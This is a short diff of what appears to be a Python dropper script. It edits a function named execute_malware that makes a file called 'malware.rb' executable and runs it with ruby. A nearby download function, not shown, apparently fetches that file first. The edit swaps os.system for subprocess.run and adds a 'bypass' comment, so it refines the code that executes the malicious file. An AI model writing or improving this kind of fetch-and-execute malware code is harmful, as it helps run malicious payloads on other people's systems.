@@ -24,7 +24,9 @@ def download(path , web):
 def execute_malware(path):
     file_path = path + '/malware.rb'
     os.chdir(path)
-    os.system('chmod +x {}'.format(file_path))
+    # bypass 
+    subprocess.run(["chmod", "+x", file_path])
+    # run the script
     subprocess.run(["ruby", file_path])
 
 # Main function
